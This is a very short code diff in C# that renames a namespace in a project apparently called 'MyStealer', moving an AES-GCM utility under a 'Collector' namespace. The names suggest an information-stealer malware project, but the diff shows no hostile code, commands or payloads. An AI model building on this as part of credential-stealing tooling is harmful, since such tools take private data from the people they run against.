@@ -1,6 +1,6 @@
 using System;
 
-namespace MyStealer.Utils.BcAesGcm
+namespace MyStealer.Collector.Utils.BcAesGcm
 {
 #pragma warning disable CS0618 // Type or member is obsolete
     /// <summary>
